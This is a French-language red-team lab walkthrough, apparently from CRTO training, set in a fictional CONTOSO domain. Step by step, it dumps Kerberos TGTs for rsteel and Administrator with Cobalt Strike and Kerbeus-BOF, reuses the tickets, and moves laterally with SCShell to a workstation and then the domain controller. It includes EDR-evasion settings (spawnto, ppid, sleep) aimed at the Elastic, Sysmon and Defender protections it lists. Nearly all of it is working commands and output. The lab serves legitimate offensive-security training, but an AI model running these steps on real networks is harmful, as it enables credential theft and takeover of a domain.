# Lab — Lateral Movement

Ce lab présente un enchaînement de **Credential Access**, d’**User Impersonation** et de **Lateral Movement** avec Cobalt Strike et SCShell, dans l’environnement CONTOSO.

## Usurpation d’identité de `rsteel`

### Charger Kerbeus-BOF

Ouvrir **Cobalt Strike > Script Manager > Load** et charger le script Kerbeus-BOF.

```
CS → Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

### Identifier les tickets Kerberos

Afficher les processus, puis examiner les tickets Kerberos disponibles dans la session.

```cs
ps
krb_triage
```

### Exporter le TGT de `rsteel`

Rechercher le ticket `krbtgt/CONTOSO.COM` de `rsteel` et afficher son contenu encodé.

```cs
krb_dump /user:rsteel /service:krbtgt
```

### Enregistrer le ticket dans un fichier

Sur l’**Attacker Desktop**, copier la valeur Base64 à la place du paramètre d’exemple pour créer `rsteel.kirbi`.

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<paste-base64-here>"))
```

### Utiliser le ticket de `rsteel`

Créer une session de connexion réseau, importer le fichier `.kirbi`, puis vérifier les tickets chargés.

```cs
make_token CONTOSO\rsteel FakePass

kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

powerpick klist
```

### Vérifier les accès SMB

Contrôler les droits du contexte Kerberos courant sur les partages administratifs des deux machines.

```cs
ls \\lon-ws-1\c$
ls \\lon-dc-1\c$
```

## Lateral Movement vers le serveur web

### Charger SCShell

Dans **Cobalt Strike > Script Manager**, charger `C:\Tools\SCShell\CS-BOF\scshell.cna`. SCShell utilise un payload de service.

### Configurer le processus du payload

Définir le processus utilisé par le payload de service.

```cs
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

### Ouvrir un Beacon sur `lon-ws-1`

Effectuer le Lateral Movement vers le serveur web avec SCShell.

```cs
jump scshell64 lon-ws-1 smb
```

Un nouveau Beacon **SYSTEM** est attendu sur `lon-ws-1`. Le message `Advapi32$StartServiceA failed to start the service. 1056` peut apparaître si le service est déjà démarré ; vérifier l’état réel du Beacon avant toute nouvelle tentative.

## Lateral Movement vers le Domain Controller

### Contrôler le Beacon du serveur web

Depuis `lon-ws-1`, vérifier l’identité, les processus, les paramètres de session et les tickets disponibles.

```
getuid
ps
sleep 3 20
ppid 432
spawnto x64 %windir%\sysnative\werfault.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

krb_triage
```

### Identifier le TGT administrateur

Cette sortie d’exemple montre notamment un TGT `Administrator @ CONTOSO.COM` dans les tickets recensés.

```
Action: List Kerberos Tickets (All Users)
--------------------------------------------------------------------------------------------------------------------------
| LUID        | Client                                   | Service                                  |            End Time |
--------------------------------------------------------------------------------------------------------------------------
| 0:0x15e244  | rsteel @ CONTOSO.COM                     | cifs/lon-ws-1                            | 27.04.2026 23:02:04 |
| 0:0x77626   | Administrator @ CONTOSO.COM              | krbtgt/CONTOSO.COM                       | 27.04.2026 22:58:52 |
| 0:0x77626   | Administrator @ CONTOSO.COM              | LDAP/lon-dc-1.contoso.com/contoso.com    | 27.04.2026 22:58:52 |
| 0:0x3e4     | lon-ws-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 27.04.2026 22:58:51 |
| 0:0x3e4     | lon-ws-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 27.04.2026 22:58:51 |
| 0:0x3e4     | lon-ws-1$ @ CONTOSO.COM                  | cifs/lon-dc-1.contoso.com                | 27.04.2026 22:58:51 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | ldap/lon-dc-1.contoso.com                | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | cifs/lon-dc-1.contoso.com/contoso.com    | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | LON-WS-1$                                | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | LDAP/lon-dc-1.contoso.com/contoso.com    | 27.04.2026 22:59:45 |
--------------------------------------------------------------------------------------------------------------------------
```

### Exporter le TGT administrateur

Récupérer le ticket `krbtgt` associé à l’utilisateur `Administrator`.

```
krb_dump /user:Administrator /service:krbtgt
```

### Enregistrer le ticket administrateur

Sur l’**Attacker Desktop**, remplacer la valeur Base64 d’exemple pour créer `administrator.kirbi`.

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<base64-ticket-administrator>"))
```

### Charger le ticket et vérifier les accès

Importer le ticket dans le Beacon, énumérer les ordinateurs et contrôler l’accès SMB au contrôleur de domaine.

```
kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi

ldapsearch (objectClass=computer) --attributes name,operatingSystem,dNSHostName
ls \\lon-dc-1\c$
```

### Examiner le résultat

Exemple de sortie montrant le contenu du partage `C$` de `lon-dc-1`.

```
[04/27 13:27:58] [*] Listing: \\lon-dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 08:20:24   PerfLogs
          dir     04/11/2025 12:01:00   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     04/27/2026 12:58:40   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     04/11/2025 10:54:00   Windows
 12kb     fil     04/27/2026 05:57:32   DumpStack.log.tmp
 1gb      fil     04/27/2026 05:57:32   pagefile.sys
```

### Ouvrir un Beacon sur le Domain Controller

Depuis le Beacon de `lon-ws-1`, exécuter les commandes de Lateral Movement suivantes.

```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```

### Vérifier le contexte sur `lon-dc-1`

Après l’apparition du Beacon, vérifier le compte utilisé, le nom de la machine et l’accès au disque. La commande `shell hostname` est signalée **OPSEC-UNSAFE** dans ces notes.

```bash
getuid
shell hostname # OPSEC-🔴UNSAFE
ls c:\
```

## Protections présentes dans le lab CRTO

| Processus | Fonction |
|---|---|
| `elastic-agent.exe` | Agent EDR Elastic |
| `elastic-endpoint.exe` | Protection endpoint Elastic |
| `Sysmon64.exe` | Journalisation des événements système |
| `MsMpEng.exe` | Microsoft Defender Antivirus |
| `NisSrv.exe` | Inspection réseau Microsoft Defender |

Les créations de processus, les connexions réseau et les named pipes peuvent être journalisés. Adapter les paramètres `ppid`, `spawnto` et `post-ex.pipename` selon les consignes du lab.

---
